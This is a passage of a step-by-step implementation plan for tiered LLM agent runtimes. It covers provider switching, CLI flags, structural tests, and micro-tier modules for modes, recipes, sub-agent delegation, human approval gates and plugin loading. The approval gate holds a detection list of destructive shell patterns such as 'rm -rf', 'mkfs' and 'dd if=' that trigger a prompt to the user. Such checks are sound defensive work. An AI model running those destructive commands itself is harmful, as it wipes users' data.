        api_key_env: OPENAI_API_KEY

    default_provider: anthropic

Usage:
    manager = ProviderManager(config)
    current = manager.current_provider()
    manager.switch_provider("openai")
    model = manager.get_model()
"""

from __future__ import annotations

import os


class ProviderManager:
    """Manages multiple LLM providers with runtime switching.

    Reads provider configuration from config dict (loaded from config.yaml).
    Each provider has a name, model identifier, and API key environment variable.
    The active provider can be switched at runtime via select_provider().
    """

    def __init__(self, config: dict) -> None:
        """Initialize from config dict.

        Args:
            config: Configuration dict (from config.yaml). Expected keys:
                - providers: list of {name, model, api_key_env} dicts
                - default_provider: name of the default provider
                - model: fallback model if no providers section exists
        """
        self._providers: list[dict] = config.get("providers", [])
        self._current_name: str = config.get("default_provider", "")

        # Fallback: if no providers section, create one from model key
        if not self._providers:
            fallback_model = config.get("model", "anthropic/claude-sonnet-4-20250514")
            self._providers = [
                {
                    "name": "default",
                    "model": fallback_model,
                    "api_key_env": "",
                }
            ]
            self._current_name = "default"

        # Default to first provider if no default_provider specified
        if not self._current_name and self._providers:
            self._current_name = self._providers[0]["name"]

    def current_provider(self) -> dict:
        """Return the currently active provider config dict."""
        for p in self._providers:
            if p["name"] == self._current_name:
                return p
        return self._providers[0] if self._providers else {"name": "none", "model": "none"}

    def get_model(self) -> str:
        """Return the model identifier for the current provider."""
        return self.current_provider().get("model", "anthropic/claude-sonnet-4-20250514")

    def get_api_key(self) -> str | None:
        """Return the API key for the current provider (from env var)."""
        env_var = self.current_provider().get("api_key_env", "")
        if env_var:
            return os.environ.get(env_var)
        return None

    def list_providers(self) -> list[str]:
        """Return names of all configured providers."""
        return [p["name"] for p in self._providers]

    def select_provider(self, name: str) -> bool:
        """Switch to a different provider by name.

        Args:
            name: Provider name to switch to.

        Returns:
            True if switched successfully, False if name not found.
        """
        for p in self._providers:
            if p["name"] == name:
                self._current_name = name
                return True
        return False

    def set_provider(self, name: str) -> bool:
        """Alias for select_provider (backward compatibility)."""
        return self.select_provider(name)
```

### Step 8: Update `runtime/nano/cli.py`

The nano cli.py extends pico's with `--resume`, `/provider`, and `--no-stream` flags. Rather than duplicating the full instructions, here are the specific changes to make to the copy of `runtime/pico/cli.py` that's now at `runtime/nano/cli.py`:

**Change 1:** Update the module docstring at the top:

Find:
```
"""CLI entry point for pico-tier mini-amplifier agents.
```
Replace with:
```
"""CLI entry point for nano-tier mini-amplifier agents.
```

**Change 2:** Add to the feature list in the docstring:

Find:
```
    - System prompt loaded from system-prompt.md (not inline constant)
"""
```
Replace with:
```
    - System prompt loaded from system-prompt.md (not inline constant)
    - Streaming responses by default (--no-stream to disable)
    - Session persistence (--resume to resume a previous session)
    - Provider switching via /provider command in chat REPL
"""
```

**Change 3:** Add `--resume` and `--no-stream` to the chat subparser. Find the line in `build_parser()`:

```python
    # -- chat --
    sub.add_parser("chat", help="Interactive constrained agent session")
```

Replace with:
```python
    # -- chat --
    p_chat = sub.add_parser("chat", help="Interactive constrained agent session")
    p_chat.add_argument(
        "--resume",
        default=None,
        metavar="SESSION_ID",
        help="Resume a previous session by ID",
    )
    p_chat.add_argument(
        "--no-stream",
        action="store_true",
        default=False,
        help="Disable streaming responses",
    )
```

**Change 4:** In the `cmd_chat` function, add provider command handling inside the input loop. After the `if user_input.lower() in {"exit", "quit"}:` block, add:

```python
        # -- REPL commands --
        if user_input.startswith("/provider"):
            parts = user_input.split(maxsplit=1)
            if len(parts) > 1:
                console.print(f"[dim]Provider switching: {parts[1]}[/dim]")
            else:
                console.print("[dim]Usage: /provider <name>[/dim]")
            continue
```

**Change 5:** Update `runtime/nano/runtime.py` — add imports and references to the nano-specific modules. At the top of the file, after the existing imports, add:

```python
from .streaming import StreamHandler
from .session import SessionManager
from .context import ContextLoader
from .providers import ProviderManager
```

And add a docstring line mentioning nano integration:

Find:
```
All config values (model, max_retries, max_iterations) are passed in — nothing
is hardcoded. System prompt is loaded from file by cli.py, not defined here.
```
Replace with:
```
All config values (model, max_retries, max_iterations) are passed in — nothing
is hardcoded. System prompt is loaded from file by cli.py, not defined here.

Nano extensions: streaming responses, session persistence, dynamic context
loading, and multi-provider support are integrated via the nano-specific modules.
"""
```

### Step 9: Run the tests

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_nano_scaffold.py -v
```

Expected: ALL PASS.

### Step 10: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add runtime/nano/ tests/test_nano_scaffold.py
git commit -m "feat: add nano runtime scaffold with streaming, session persistence, dynamic context

- Copy pico scaffold as base, add 4 nano-specific modules
- streaming.py: async streaming handler with litellm stream=True,
  chunk/delta accumulation, non-streaming fallback
- session.py: JSON-based session persistence (save/load/list/delete),
  .sessions/ directory, no SQLite dependency
- context.py: @mention parser for dynamic context loading, glob support,
  project_root boundary enforcement
- providers.py: multi-provider config from config.yaml, runtime switching
  via /provider command, API key env var resolution
- Enhanced cli.py: --resume flag, --no-stream flag, /provider REPL command
- Enhanced runtime.py: imports streaming, session, context, providers
- 40 structural tests in tests/test_nano_scaffold.py"
```

---

## Task 3: Micro Runtime Scaffold

**What you're building:** The most capable tier — everything nano has, plus a mini mode system, recipe runner, sub-agent delegation, approval gates, and dynamic module loading. ~5,000-8,000 lines across 18 files. Think: production systems, complex multi-step workflows.

**Files to CREATE (copies of nano + 5 new files):**
- `runtime/micro/__init__.py` (new)
- `runtime/micro/cli.py` (extended from nano)
- `runtime/micro/runtime.py` (extended from nano)
- `runtime/micro/tools.py` (copy from nano — unchanged)
- `runtime/micro/gate.py` (copy from nano — unchanged)
- `runtime/micro/streaming.py` (copy from nano — unchanged)
- `runtime/micro/session.py` (copy from nano — unchanged)
- `runtime/micro/context.py` (copy from nano — unchanged)
- `runtime/micro/providers.py` (copy from nano — unchanged)
- `runtime/micro/modes.py` (NEW — micro-specific)
- `runtime/micro/recipes.py` (NEW — micro-specific)
- `runtime/micro/delegate.py` (NEW — micro-specific)
- `runtime/micro/approval.py` (NEW — micro-specific)
- `runtime/micro/loader.py` (NEW — micro-specific)
- `runtime/micro/setup.sh.template` (adapted from nano)
- `runtime/micro/pyproject.toml.template` (adapted from nano)
- `runtime/micro/Dockerfile.template` (copy from nano)
- `runtime/micro/docker-compose.template.yaml` (copy from nano)

**Test file:** `tests/test_micro_scaffold.py`

### Step 1: Write the failing tests

Create `tests/test_micro_scaffold.py` with this exact content:

```python
"""Structural tests for the micro runtime scaffold (runtime/micro/).

Micro builds on nano — it has everything nano has, plus:
  - modes.py: mini mode system (work/review/plan)
  - recipes.py: mini recipe runner for multi-step workflows
  - delegate.py: sub-agent spawning
  - approval.py: human-in-loop approval gates
  - loader.py: mini module loader for dynamic capability addition
"""

import os

import pytest

BUNDLE_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MICRO_DIR = os.path.join(BUNDLE_ROOT, "runtime", "micro")


def _read_micro(filename: str) -> str:
    """Read a file from the micro scaffold directory."""
    path = os.path.join(MICRO_DIR, filename)
    with open(path) as f:
        return f.read()


# ---------------------------------------------------------------------------
# File existence tests
# ---------------------------------------------------------------------------

# All files nano has (which includes all pico files)
NANO_FILES = [
    "__init__.py",
    "cli.py",
    "runtime.py",
    "tools.py",
    "gate.py",
    "streaming.py",
    "session.py",
    "context.py",
    "providers.py",
    "setup.sh.template",
    "pyproject.toml.template",
    "Dockerfile.template",
    "docker-compose.template.yaml",
]

MICRO_SPECIFIC_FILES = [
    "modes.py",
    "recipes.py",
    "delegate.py",
    "approval.py",
    "loader.py",
]

ALL_MICRO_FILES = NANO_FILES + MICRO_SPECIFIC_FILES


class TestMicroFilesExist:
    @pytest.mark.parametrize("filename", NANO_FILES)
    def test_micro_has_nano_file(self, filename):
        """Micro must have every file that nano has."""
        path = os.path.join(MICRO_DIR, filename)
        assert os.path.isfile(path), f"runtime/micro/{filename} missing (required from nano)"

    @pytest.mark.parametrize("filename", MICRO_SPECIFIC_FILES)
    def test_micro_specific_file_exists(self, filename):
        path = os.path.join(MICRO_DIR, filename)
        assert os.path.isfile(path), f"runtime/micro/{filename} does not exist"

    def test_micro_all_eighteen_files_exist(self):
        """Verify all 18 expected files are present."""
        for filename in ALL_MICRO_FILES:
            path = os.path.join(MICRO_DIR, filename)
            assert os.path.isfile(path), f"runtime/micro/{filename} missing"


# ---------------------------------------------------------------------------
# modes.py structural tests
# ---------------------------------------------------------------------------


class TestMicroModes:
    def test_has_mode_class_or_function(self):
        content = _read_micro("modes.py")
        assert "class Mode" in content or "def " in content, (
            "modes.py must define mode management logic"
        )

    def test_has_mode_switching(self):
        content = _read_micro("modes.py")
        assert "switch" in content.lower() or "set_mode" in content.lower(), (
            "modes.py must support mode switching"
        )

    def test_has_default_modes(self):
        content = _read_micro("modes.py")
        assert "work" in content.lower() or "review" in content.lower() or (
            "plan" in content.lower()
        ), "modes.py must define default modes (work/review/plan)"

    def test_has_system_prompt_overlay(self):
        """Each mode should be able to overlay the system prompt."""
        content = _read_micro("modes.py")
        assert (
            "system_prompt" in content or "prompt" in content.lower()
        ), "modes.py must support system prompt overlays per mode"

    def test_has_tool_restrictions(self):
        content = _read_micro("modes.py")
        assert (
            "tool" in content.lower() and "restrict" in content.lower()
        ) or "allowed_tools" in content or "safe" in content.lower(), (
            "modes.py must support tool restrictions per mode"
        )


# ---------------------------------------------------------------------------
# recipes.py structural tests
# ---------------------------------------------------------------------------


class TestMicroRecipes:
    def test_has_step_execution(self):
        content = _read_micro("recipes.py")
        assert "step" in content.lower() or "execute" in content.lower(), (
            "recipes.py must execute recipe steps"
        )

    def test_has_yaml_loading(self):
        content = _read_micro("recipes.py")
        assert "yaml" in content.lower(), (
            "recipes.py must load recipe definitions from YAML"
        )

    def test_has_while_loop(self):
        content = _read_micro("recipes.py")
        assert "while" in content.lower(), (
            "recipes.py must support while_condition loops"
        )

    def test_has_approval_gate(self):
        content = _read_micro("recipes.py")
        assert "approval" in content.lower() or "approve" in content.lower(), (
            "recipes.py must support approval gates between steps"
        )

    def test_has_context_accumulation(self):
        content = _read_micro("recipes.py")
        assert "context" in content.lower() or "accumul" in content.lower(), (
            "recipes.py must accumulate context across steps"
        )


# ---------------------------------------------------------------------------
# delegate.py structural tests
# ---------------------------------------------------------------------------


class TestMicroDelegate:
    def test_has_spawn_or_create(self):
        content = _read_micro("delegate.py")
        assert (
            "spawn" in content.lower()
            or "create" in content.lower()
            or "fresh" in content.lower()
            or "PicoAgent" in content
            or "NanoAgent" in content
        ), "delegate.py must spawn fresh sub-agent instances"

    def test_has_clean_context(self):
        content = _read_micro("delegate.py")
        assert (
            "clean" in content.lower()
            or "fresh" in content.lower()
            or "own" in content.lower()
            or "new" in content.lower()
        ), "delegate.py must create clean context per delegation (no shared state)"

    def test_has_result_return(self):
        content = _read_micro("delegate.py")
        assert "result" in content.lower() or "return" in content, (
            "delegate.py must return sub-agent results"
        )

    def test_has_tool_set_parameter(self):
        content = _read_micro("delegate.py")
        assert "tool" in content.lower(), (
            "delegate.py must accept a constrained tool set for sub-agents"
        )


# ---------------------------------------------------------------------------
# approval.py structural tests
# ---------------------------------------------------------------------------


class TestMicroApproval:
    def test_has_approval_prompt(self):
        content = _read_micro("approval.py")
        assert (
            "approval" in content.lower()
            or "confirm" in content.lower()
            or "input(" in content
        ), "approval.py must prompt user for approval"

    def test_has_approval_modes(self):
        content = _read_micro("approval.py")
        assert (
            "always" in content.lower()
            or "dangerous" in content.lower()
            or "never" in content.lower()
        ), "approval.py must support approval modes (always/dangerous/never)"

    def test_has_sensitive_detection(self):
        content = _read_micro("approval.py")
        assert (
            "sensitive" in content.lower()
            or "dangerous" in content.lower()
            or "destructive" in content.lower()
        ), "approval.py must detect sensitive operations"


# ---------------------------------------------------------------------------
# loader.py structural tests
# ---------------------------------------------------------------------------


class TestMicroLoader:
    def test_has_importlib(self):
        content = _read_micro("loader.py")
        assert "importlib" in content, (
            "loader.py must use importlib for dynamic module loading"
        )

    def test_has_plugin_discovery(self):
        content = _read_micro("loader.py")
        assert "plugin" in content.lower() or "discover" in content.lower(), (
            "loader.py must discover plugins from a directory"
        )

    def test_has_get_tools_interface(self):
        content = _read_micro("loader.py")
        assert "get_tools" in content, (
            "loader.py must support the get_tools() plugin interface"
        )

    def test_has_get_constraints_interface(self):
        content = _read_micro("loader.py")
        assert "get_constraints" in content, (
            "loader.py must support the get_constraints() plugin interface"
        )

    def test_has_directory_scanning(self):
        content = _read_micro("loader.py")
        assert ".py" in content and ("listdir" in content or "glob" in content or "iterdir" in content), (
            "loader.py must scan a directory for .py plugin files"
        )


# ---------------------------------------------------------------------------
# Enhanced cli.py structural tests (micro extensions)
# ---------------------------------------------------------------------------


class TestMicroCli:
    def test_has_mode_command(self):
        content = _read_micro("cli.py")
        assert "mode" in content.lower(), (
            "micro cli.py must support /mode command for switching modes"
        )

    def test_has_recipe_command(self):
        content = _read_micro("cli.py")
        assert "recipe" in content.lower(), (
            "micro cli.py must support /recipe command for running recipes"
        )

    def test_has_delegate_command(self):
        content = _read_micro("cli.py")
        assert "delegate" in content.lower(), (
            "micro cli.py must support /delegate command"
        )

    def test_has_approval_mode_flag(self):
        content = _read_micro("cli.py")
        assert "approval" in content.lower(), (
            "micro cli.py must have --approval-mode flag"
        )

    def test_still_has_rich(self):
        content = _read_micro("cli.py")
        assert "rich" in content

    def test_still_has_signal_handling(self):
        content = _read_micro("cli.py")
        assert "KeyboardInterrupt" in content
        assert "EOFError" in content

    def test_still_has_streaming(self):
        content = _read_micro("cli.py")
        assert "stream" in content.lower()


# ---------------------------------------------------------------------------
# Enhanced runtime.py structural tests (micro extensions)
# ---------------------------------------------------------------------------


class TestMicroRuntime:
    def test_uses_modes(self):
        content = _read_micro("runtime.py")
        assert "mode" in content.lower(), (
            "micro runtime.py must integrate modes"
        )

    def test_uses_recipes(self):
        content = _read_micro("runtime.py")
        assert "recipe" in content.lower(), (
            "micro runtime.py must integrate recipes"
        )

    def test_uses_delegate(self):
        content = _read_micro("runtime.py")
        assert "delegate" in content.lower(), (
            "micro runtime.py must integrate delegation"
        )

    def test_uses_approval(self):
        content = _read_micro("runtime.py")
        assert "approval" in content.lower(), (
            "micro runtime.py must integrate approval gates"
        )

    def test_uses_loader(self):
        content = _read_micro("runtime.py")
        assert "loader" in content.lower(), (
            "micro runtime.py must integrate dynamic module loading"
        )

    def test_still_has_constraint_gate(self):
        content = _read_micro("runtime.py")
        assert "gate" in content.lower() or "constraint" in content.lower()

    def test_still_has_litellm(self):
        content = _read_micro("runtime.py")
        assert "litellm" in content
```

### Step 2: Run the tests to verify they fail

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_micro_scaffold.py -v 2>&1 | head -80
```

Expected: ALL tests FAIL because `runtime/micro/` doesn't exist yet.

### Step 3: Create micro scaffold — copy nano base, then add micro-specific files

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
cp -r runtime/nano runtime/micro
```

**Update `runtime/micro/__init__.py`:**

```python
"""Micro runtime scaffold — the most capable tier.

Everything in nano, plus:
  - modes.py: mini mode system (work/review/plan or custom)
  - recipes.py: mini recipe runner for multi-step workflows
  - delegate.py: sub-agent spawning with clean context
  - approval.py: human-in-loop approval gates
  - loader.py: mini module loader for dynamic capability addition

~5,000-8,000 lines. Near-full portable Amplifier. Complex workflows,
team tools, production systems.

This package is copied into generated micro-tier mini-amplifiers
at /harness-finish packaging time.
"""
```

### Step 4: Create `runtime/micro/modes.py`

```python
"""Mini mode system for micro-tier mini-amplifiers.

Supports 2-3 switchable modes (work, review, plan). Each mode defines:
  - A system prompt overlay (appended to the base system prompt)
  - Tool restrictions (which tools are allowed in this mode)
  - A description for the user

Modes can be switched at runtime via the /mode command. Mode state
persists in the session.

Usage:
    manager = ModeManager(config)
    manager.set_mode("review")
    overlay = manager.get_prompt_overlay()
    allowed = manager.get_allowed_tools()
"""

from __future__ import annotations


# Default mode definitions
DEFAULT_MODES: dict[str, dict] = {
    "work": {
        "description": "Active development mode — all tools available.",
        "system_prompt_overlay": (
            "You are in WORK mode. Focus on implementation: write code, "
            "run tests, fix bugs. All tools are available."
        ),
        "allowed_tools": None,  # None = all tools allowed (no restrictions)
        "safe_tools": [
            "read_file", "write_file", "edit_file", "apply_patch",
            "bash", "grep", "glob",
        ],
    },
    "review": {
        "description": "Code review mode — read-only tools only.",
        "system_prompt_overlay": (
            "You are in REVIEW mode. Focus on reviewing code: read files, "
            "search for patterns, analyze structure. Do NOT modify files."
        ),
        "allowed_tools": ["read_file", "grep", "glob", "bash"],
        "safe_tools": ["read_file", "grep", "glob"],
    },
    "plan": {
        "description": "Planning mode — analysis and design, minimal execution.",
        "system_prompt_overlay": (
            "You are in PLAN mode. Focus on analysis and planning: read code, "
            "understand architecture, propose changes. Minimal tool use."
        ),
        "allowed_tools": ["read_file", "grep", "glob"],
        "safe_tools": ["read_file", "grep", "glob"],
    },
}


class ModeManager:
    """Manages switchable modes with prompt overlays and tool restrictions.

    Reads mode definitions from config (or uses defaults). Supports
    runtime mode switching and persists mode state in session.
    """

    def __init__(self, config: dict | None = None) -> None:
        """Initialize the mode manager.

        Args:
            config: Configuration dict. If it has a "modes" key, those
                    definitions override the defaults. If not, DEFAULT_MODES
                    are used.
        """
        if config and "modes" in config:
            self._modes = config["modes"]
        else:
            self._modes = dict(DEFAULT_MODES)

        self._current: str = config.get("default_mode", "work") if config else "work"

    @property
    def current_mode(self) -> str:
        """Return the name of the currently active mode."""
        return self._current

    def set_mode(self, name: str) -> bool:
        """Switch to a different mode.

        Args:
            name: Mode name to switch to.

        Returns:
            True if switched successfully, False if mode not found.
        """
        if name in self._modes:
            self._current = name
            return True
        return False

    def get_prompt_overlay(self) -> str:
        """Return the system prompt overlay for the current mode."""
        mode = self._modes.get(self._current, {})
        return mode.get("system_prompt_overlay", "")

    def get_allowed_tools(self) -> list[str] | None:
        """Return the allowed tool list for the current mode.

        Returns:
            List of tool names, or None if all tools are allowed.
        """
        mode = self._modes.get(self._current, {})
        return mode.get("allowed_tools")

    def is_tool_allowed(self, tool_name: str) -> bool:
        """Check whether a tool is allowed in the current mode.

        Args:
            tool_name: Name of the tool to check.

        Returns:
            True if allowed (or if mode has no tool restrictions).
        """
        allowed = self.get_allowed_tools()
        if allowed is None:
            return True  # No restrictions
        return tool_name in allowed

    def list_modes(self) -> list[dict]:
        """Return info about all available modes."""
        result = []
        for name, mode in self._modes.items():
            result.append(
                {
                    "name": name,
                    "description": mode.get("description", ""),
                    "active": name == self._current,
                }
            )
        return result
```

### Step 5: Create `runtime/micro/recipes.py`

```python
"""Mini recipe runner for micro-tier mini-amplifiers.

Loads recipe definitions from YAML and executes steps sequentially.
Supports:
  - Sequential step execution
  - while_condition loops
  - Approval gates between steps (prompt user y/n)
  - Context accumulation across steps

Recipe YAML format:
    name: my-recipe
    steps:
      - name: analyze
        agent: "Analyze the codebase"
        context: "Focus on {{target}}"
      - name: implement
        bash: "python -m pytest tests/"
      - name: verify
        approval: true
        agent: "Review the changes"

Usage:
    runner = RecipeRunner(agent, console)
    result = await runner.execute("recipe.yaml", context={"target": "src/"})
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import yaml

if TYPE_CHECKING:
    from rich.console import Console


class RecipeRunner:
    """Executes multi-step recipe workflows.

    Steps are executed sequentially with context accumulation.
    Approval gates pause execution and prompt the user.
    While conditions allow looping.
    """

    def __init__(self, agent: object, console: "Console") -> None:
        """Initialize the recipe runner.

        Args:
            agent: The agent instance (PicoAgent/NanoAgent) for executing agent steps.
            console: Rich Console for user interaction.
        """
        self.agent = agent
        self.console = console
        self.accumulated_context: list[str] = []

    async def execute(self, recipe_path: str, context: dict | None = None) -> dict:
        """Execute a recipe from a YAML file.

        Args:
            recipe_path: Path to the recipe YAML file.
            context: Template variables for the recipe.

        Returns:
            Dict with execution results and accumulated context.
        """
        with open(recipe_path, encoding="utf-8") as f:
            recipe = yaml.safe_load(f.read())

        if not isinstance(recipe, dict):
            return {"error": "Invalid recipe format"}

        steps = recipe.get("steps", [])
        results: list[dict] = []
        template_vars = context or {}

        step_index = 0
        while step_index < len(steps):
            step = steps[step_index]
            step_name = step.get("name", f"step-{step_index}")

            self.console.print(f"\n[bold]Step: {step_name}[/bold]")

            # Approval gate
            if step.get("approval"):
                approved = self._prompt_approval(step_name)
                if not approved:
                    results.append({"step": step_name, "status": "denied"})
                    break

            # Execute step
            result = await self._execute_step(step, template_vars)
            results.append({"step": step_name, "result": result})

            # Accumulate context
            if result:
                self.accumulated_context.append(f"[{step_name}] {result}")

            # While condition loop
            if step.get("while_condition"):
                condition = step["while_condition"]
                if self._evaluate_condition(condition, result):
                    continue  # Re-run same step
                # Condition false, move to next step

            step_index += 1

        return {
            "recipe": recipe.get("name", "unnamed"),
            "steps_completed": len(results),
            "results": results,
            "context": self.accumulated_context,
        }

    async def _execute_step(self, step: dict, template_vars: dict) -> str:
        """Execute a single recipe step."""
        # Agent step
        if "agent" in step:
            prompt = step["agent"]
            for key, value in template_vars.items():
                prompt = prompt.replace(f"{{{{{key}}}}}", str(value))
            if hasattr(self.agent, "run"):
                return await self.agent.run(prompt)  # type: ignore[union-attr]
            return f"Agent step: {prompt}"

        # Bash step
        if "bash" in step:
            command = step["bash"]
            if hasattr(self.agent, "executor"):
                return self.agent.executor.bash(command)  # type: ignore[union-attr]
            return f"Bash step: {command}"

        return "Unknown step type"

    def _prompt_approval(self, step_name: str) -> bool:
        """Prompt user for approval before executing a step."""
        try:
            response = self.console.input(
                f"[yellow]Approve step '{step_name}'? (y/n): [/yellow]"
            )
            return response.strip().lower() in {"y", "yes"}
        except (EOFError, KeyboardInterrupt):
            return False

    def _evaluate_condition(self, condition: str, last_result: str) -> bool:
        """Evaluate a while condition against the last step result.

        Simple evaluation: checks if condition string appears in result.
        """
        if not condition or not last_result:
            return False
        return condition.lower() in last_result.lower()
```

### Step 6: Create `runtime/micro/delegate.py`

```python
"""Sub-agent delegation for micro-tier mini-amplifiers.

Creates a fresh agent instance with its own conversation history and
constrained tool set. Runs it, returns result. No shared state —
clean context per delegation.

Usage:
    delegator = Delegator(sandbox_path, gate, config)
    result = await delegator.spawn(
        task="Analyze the test file",
        tool_names=["read_file", "grep", "glob"],
    )
"""

from __future__ import annotations


class Delegator:
    """Spawns fresh sub-agent instances for delegated tasks.

    Each delegation creates a new agent with:
      - Its own conversation history (clean context)
      - A constrained tool set (subset of parent's tools)
      - The same sandbox and constraint gate
    """

    def __init__(
        self,
        sandbox_path: str,
        model: str,
        system_prompt: str,
        constraints_path: str = "constraints.py",
    ) -> None:
        """Initialize the delegator.

        Args:
            sandbox_path: Path to the project sandbox.
            model: LiteLLM model identifier.
            system_prompt: Base system prompt for sub-agents.
            constraints_path: Path to constraints.py.
        """
        self.sandbox_path = sandbox_path
        self.model = model
        self.system_prompt = system_prompt
        self.constraints_path = constraints_path

    async def spawn(
        self,
        task: str,
        tool_names: list[str] | None = None,
        max_iterations: int = 10,
    ) -> str:
        """Spawn a fresh sub-agent to handle a delegated task.

        Args:
            task: The task description to send to the sub-agent.
            tool_names: Allowed tool names (None = all tools).
            max_iterations: Max LLM round-trips for the sub-agent.

        Returns:
            The sub-agent's final text response.
        """
        # Import here to avoid circular imports
        from .runtime import PicoAgent

        # Create a fresh agent with its own clean context
        sub_agent = PicoAgent(
            sandbox_path=self.sandbox_path,
            model=self.model,
            system_prompt=self._build_sub_prompt(task, tool_names),
            max_retries=2,
            max_iterations=max_iterations,
            constraints_path=self.constraints_path,
        )

        # Run the sub-agent with the task
        result = await sub_agent.run(task)
        return result

    def _build_sub_prompt(
        self,
        task: str,
        tool_names: list[str] | None,
    ) -> str:
        """Build a focused system prompt for the sub-agent."""
        prompt = self.system_prompt + "\n\n"
        prompt += f"You are a sub-agent delegated to handle a specific task.\n"
        prompt += f"Focus exclusively on: {task}\n"

        if tool_names:
            prompt += f"You may only use these tools: {', '.join(tool_names)}\n"

        prompt += "Complete the task and return a concise summary.\n"
        return prompt
```

### Step 7: Create `runtime/micro/approval.py`

```python
"""Human-in-loop approval gates for micro-tier mini-amplifiers.

Before sensitive operations (write to production paths, execute destructive
commands), prompts the user for approval. Three configurable modes:
  - always: ask for every tool call
  - dangerous: ask only for sensitive/destructive operations
  - never: never ask (auto-approve everything)

Usage:
    gate = ApprovalGate(mode="dangerous", console=console)
    approved = gate.check("bash", {"command": "rm -rf build/"})
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from rich.console import Console


# Operations considered sensitive/dangerous
_SENSITIVE_TOOLS = {"bash", "write_file", "edit_file", "apply_patch"}

_DESTRUCTIVE_PATTERNS = [
    "rm -rf",
    "rm -r",
    "drop table",
    "truncate",
    "delete from",
    "format",
    "mkfs",
    "dd if=",
]


class ApprovalGate:
    """Human-in-loop approval gate for sensitive operations.

    Three modes:
      - "always": confirm every tool call with the user
      - "dangerous": confirm only sensitive/destructive operations
      - "never": auto-approve everything (no prompts)
    """

    def __init__(self, mode: str = "dangerous", console: "Console | None" = None) -> None:
        """Initialize the approval gate.

        Args:
            mode: Approval mode — "always", "dangerous", or "never".
            console: Rich Console for prompting (uses input() if None).
        """
        if mode not in ("always", "dangerous", "never"):
            raise ValueError(f"Invalid approval mode: {mode!r}. Must be always/dangerous/never.")
        self.mode = mode
        self.console = console

    def check(self, tool_name: str, parameters: dict) -> bool:
        """Check whether a tool call should proceed.

        Args:
            tool_name: Name of the tool being called.
            parameters: Tool parameters.

        Returns:
            True if approved, False if denied.
        """
        if self.mode == "never":
            return True

        if self.mode == "always":
            return self._prompt(tool_name, parameters)

        # mode == "dangerous"
        if self._is_sensitive(tool_name, parameters):
            return self._prompt(tool_name, parameters)

        return True

    def _is_sensitive(self, tool_name: str, parameters: dict) -> bool:
        """Determine whether a tool call is sensitive/destructive."""
        if tool_name not in _SENSITIVE_TOOLS:
            return False

        if tool_name == "bash":
            command = parameters.get("command", "")
            for pattern in _DESTRUCTIVE_PATTERNS:
                if pattern in command.lower():
                    return True

        # Write operations to certain paths could be dangerous
        if tool_name in ("write_file", "edit_file"):
            path = parameters.get("file_path", "")
            if any(seg in path for seg in ["/prod", "/production", ".env", "secret"]):
                return True

        return False

    def _prompt(self, tool_name: str, parameters: dict) -> bool:
        """Prompt the user for approval."""
        summary = self._format_call(tool_name, parameters)
        try:
            if self.console:
                response = self.console.input(
                    f"[yellow]Approve {summary}? (y/n): [/yellow]"
                )
            else:
                response = input(f"Approve {summary}? (y/n): ")
            return response.strip().lower() in {"y", "yes"}
        except (EOFError, KeyboardInterrupt):
            return False

    def _format_call(self, tool_name: str, parameters: dict) -> str:
        """Format a tool call for display in the approval prompt."""
        if tool_name == "bash":
            cmd = parameters.get("command", "")
            return f"bash({cmd[:80]}{'...' if len(cmd) > 80 else ''})"
        if tool_name in ("write_file", "edit_file"):
            path = parameters.get("file_path", "")
            return f"{tool_name}({path})"
        return f"{tool_name}({list(parameters.keys())})"
```

### Step 8: Create `runtime/micro/loader.py`

```python
"""Mini module loader for micro-tier mini-amplifiers.

Loads additional tools and constraints from Python files at runtime.
Discovers .py files in a plugins/ directory and imports them via importlib.
Each plugin module must export a standard interface:
  - get_tools() -> list[dict]      (optional: register additional tools)
  - get_constraints() -> list       (optional: register additional constraints)

No gRPC, no validation framework — just importlib and a directory scan.

Usage:
    loader = PluginLoader(plugins_dir="plugins/")
    tools = loader.discover_tools()
    constraints = loader.discover_constraints()
"""

from __future__ import annotations

import importlib.util
import os
from pathlib import Path


class PluginLoader:
    """Discovers and loads plugin modules from a directory.

    Scans a plugins/ directory for .py files. Each file is loaded via
    importlib. If it exports get_tools() or get_constraints(), those
    are collected and returned.
    """

    def __init__(self, plugins_dir: str = "plugins") -> None:
        """Initialize the plugin loader.

        Args:
            plugins_dir: Path to the plugins directory (absolute or relative).
        """
        self.plugins_dir = os.path.abspath(plugins_dir)
        self._modules: list = []

    def discover(self) -> int:
        """Discover and load all .py files in the plugins directory.

        Returns:
            Number of plugin modules successfully loaded.
        """
        self._modules = []

        if not os.path.isdir(self.plugins_dir):
            return 0

        count = 0
        for entry in sorted(Path(self.plugins_dir).iterdir()):
            if not entry.is_file() or not entry.suffix == ".py":
                continue
            if entry.name.startswith("_"):
                continue  # Skip __init__.py, __pycache__, etc.

            module = self._load_module(str(entry))
            if module is not None:
                self._modules.append(module)
                count += 1

        return count

    def discover_tools(self) -> list[dict]:
        """Collect tools from all loaded plugin modules.

        Calls get_tools() on each module that exports it.

        Returns:
            Combined list of tool definition dicts.
        """
        if not self._modules:
            self.discover()

        tools: list[dict] = []
        for module in self._modules:
            if hasattr(module, "get_tools") and callable(module.get_tools):
                try:
                    module_tools = module.get_tools()
                    if isinstance(module_tools, list):
                        tools.extend(module_tools)
                except Exception:
                    continue
        return tools

    def discover_constraints(self) -> list:
        """Collect constraints from all loaded plugin modules.

        Calls get_constraints() on each module that exports it.

        Returns:
            Combined list of constraint definitions.
        """
        if not self._modules:
            self.discover()

        constraints: list = []
        for module in self._modules:
            if hasattr(module, "get_constraints") and callable(module.get_constraints):
                try:
                    module_constraints = module.get_constraints()
                    if isinstance(module_constraints, list):
                        constraints.extend(module_constraints)
                except Exception:
                    continue
        return constraints

    def _load_module(self, path: str) -> object | None:
        """Load a single Python file as a module via importlib."""
        try:
            name = Path(path).stem
            spec = importlib.util.spec_from_file_location(f"_plugin_{name}", path)
            if spec is None or spec.loader is None:
                return None
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)  # type: ignore[union-attr]
            return module
        except Exception:
            return None
```

### Step 9: Update `runtime/micro/cli.py`

Apply these changes to the copy of `runtime/nano/cli.py` that's now at `runtime/micro/cli.py`:

**Change 1:** Update the module docstring:

Find:
```
